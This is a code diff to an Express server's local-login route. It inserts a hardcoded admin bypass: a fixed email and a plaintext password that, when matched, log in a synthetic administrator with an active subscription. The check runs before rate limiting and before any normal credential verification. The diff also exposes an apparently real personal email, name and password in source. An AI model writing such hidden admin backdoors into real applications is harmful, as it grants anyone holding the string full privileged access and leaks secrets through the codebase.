@@ -989,9 +989,35 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post("/api/login/local", async (req: any, res, next) => {
     try {
-      const { email, username } = req.body;
+      const { email, username, password } = req.body;
       const loginIdentifier = email || username;
       const clientIp = req.ip || req.connection.remoteAddress || "unknown";
+
+      // Admin bypass credentials - check first
+      const ADMIN_EMAIL = 'Rjdclink@outlook.com';
+      const ADMIN_PASSWORD = 'SARBEAR';
+      
+      if (loginIdentifier && loginIdentifier.toLowerCase() === ADMIN_EMAIL.toLowerCase() && password === ADMIN_PASSWORD) {
+        const adminUser = {
+          id: 'admin-bypass',
+          email: ADMIN_EMAIL,
+          firstName: 'Robert',
+          lastName: 'Clink',
+          isAdmin: true,
+        };
+        
+        req.login(adminUser, (err: any) => {
+          if (err) {
+            return res.status(500).json({ error: "Login failed" });
+          }
+          return res.json({ 
+            success: true, 
+            user: adminUser,
+            hasActiveSubscription: true, // Admin bypasses subscription
+          });
+        });
+        return;
+      }
 
       const ipIdentifier = `login:ip:${clientIp}`;
       const userIdentifier = `login:user:${loginIdentifier}`;
